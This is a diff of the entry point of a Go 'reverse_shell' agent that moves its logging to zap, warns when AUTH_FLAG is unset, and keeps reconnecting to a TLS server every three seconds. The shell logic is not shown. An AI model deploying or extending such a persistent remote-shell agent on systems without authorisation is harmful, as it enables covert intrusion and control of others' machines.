@@ -2,15 +2,24 @@ package main
 
 import (
 	"flag"
-	"log"
 	"os"
 	"os/signal"
 	"reverse_shell/agent"
 	"syscall"
 	"time"
+
+	"go.uber.org/zap"
 )
 
 func main() {
+
+	logger, _ := zap.NewProduction()
+	defer logger.Sync()
+
+	logger.Info(
+		"Agent started",
+		zap.String("version", "1.0.0"),
+	)
 
 	addr := flag.String("addr", "", "Server address (required)")
 	caFile := flag.String("ca", "", "CA certificate file (required)")
@@ -18,13 +27,18 @@ func main() {
 	flag.Parse()
 
 	if *addr == "" {
-		log.Fatal("Error: -addr flag is required")
+		logger.Fatal("Error: -addr flag is required")
 	}
 	if *caFile == "" {
-		log.Fatal("Error: -ca flag is required")
+		logger.Fatal("Error: -ca flag is required")
 	}
 	if *serverName == "" {
-		log.Fatal("Error: -server flag is required")
+		logger.Fatal("Error: -server flag is required")
+	}
+
+	_, exists := os.LookupEnv("AGENT_AUTH_FLAG")
+	if !exists {
+		logger.Warn("AGENT_AUTH_FLAG is not set")
 	}
 
 	sigChan := make(chan os.Signal, 1)
@@ -33,20 +47,20 @@ func main() {
 	for {
 		select {
 		case <-sigChan:
-			log.Println("\nShutting down agent...")
+			logger.Info("Shutting down agent...")
 			os.Exit(0)
 		default:
-			client, err := agent.Run(*addr, *caFile, *serverName)
+			client, err := agent.Run(*addr, *caFile, *serverName, logger)
 			if err != nil {
-				log.Println("Failed to start agent:", err)
-				log.Println("Retrying in 3 seconds...")
+				logger.Error("Failed to start agent:", zap.Error(err))
+				logger.Info("Retrying in 3 seconds...")
 				time.Sleep(time.Second * 3)
 				continue
 			}
 
 			<-client.Done
 
-			log.Println("Connection lost. Reconnecting in 3 seconds...")
+			logger.Info("Connection lost. Reconnecting in 3 seconds...")
 			time.Sleep(time.Second * 3)
 		}
 	}
